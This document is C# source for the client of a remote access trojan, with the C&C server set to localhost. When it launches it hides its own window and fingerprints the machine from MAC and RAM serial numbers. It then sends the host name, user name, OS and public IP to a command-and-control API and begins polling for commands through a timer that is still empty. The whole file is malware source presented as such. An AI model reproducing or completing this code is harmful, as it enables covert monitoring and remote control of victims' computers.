using System;
using System.Windows.Forms;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Security.Cryptography;
using System.Threading;

namespace Client
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            tmrHide.Start();

            // Send hardwarehash to C&C server and connect
            var hardwareHash = GetHash();

            Thread.Sleep(5000);

            string result;
            using (WebClient wc = new WebClient())
            {
                result = wc.DownloadString("http://localhost:53139/api/rat/" + hardwareHash);
            }

            if (result == "false")
            {
                // New connection
                using (WebClient wc = new WebClient())
                {
                    // hash, host, ip, os
                    var clientId = wc.DownloadString($"http://localhost:53139/api/rat/create/{hardwareHash}/{GetHostName()}/{GetWanIp()}/{GetOs()}");
                }
            }
            else
            {
                // client connected before
                string clientId = result;
                tmrCommand.Start();
            }
        }

        private void tmrHide_Tick(object sender, EventArgs e)
        {
            Hide();
            tmrHide.Stop();
        }

        private string GetMacAddress()
        {
            string mac = string.Empty;
            string query = "SELECT MacAddress FROM Win32_NetworkAdapter";
            ManagementObjectSearcher search = new ManagementObjectSearcher(query);
            ManagementObjectCollection coll = search.Get();
            foreach(var obj in coll)
            {
                if(obj["MacAddress"] != null)
                {
                    mac += obj["MacAddress"].ToString();
                }
            }

            return mac;
        }

        private string GetWanIp()
        {
            string ip;

            using (var wc = new WebClient())
            {
                ip = wc.DownloadString("https://api.ipify.org");
            }

            return ip;
        }
        

        private string GetOs()
        {
            return Environment.OSVersion.ToString();
        }

        private string GetHostName()
        {
            return Environment.MachineName + " - " + Environment.UserName;
        }

        private string GetRamSerial()
        {
            string ram = string.Empty;
            string query = "SELECT SerialNumber FROM Win32_PhysicalMemory";
            ManagementObjectSearcher search = new ManagementObjectSearcher(query);
            ManagementObjectCollection coll = search.Get();
            foreach (var obj in coll)
            {
                if (obj["SerialNumber"] != null)
                {
                    ram += obj["SerialNumber"].ToString();
                }
            }

            return ram;
        }

        private string GetHash()
        {
            string toEncode = GetMacAddress() + GetRamSerial();
            toEncode = toEncode.Replace(":", "").Replace(" ", "");

            byte[] bytes = Encoding.Unicode.GetBytes(toEncode);
            SHA256Managed sha256 = new SHA256Managed();
            byte[] hash = sha256.ComputeHash(bytes);

            string hashedString = string.Empty;
            foreach(byte x in hash)
            {
                hashedString += string.Format("{0:x2}", x);
            }

            return hashedString;
        }

        private void tmrCommand_Tick(object sender, EventArgs e)
        {

        }
    }
}
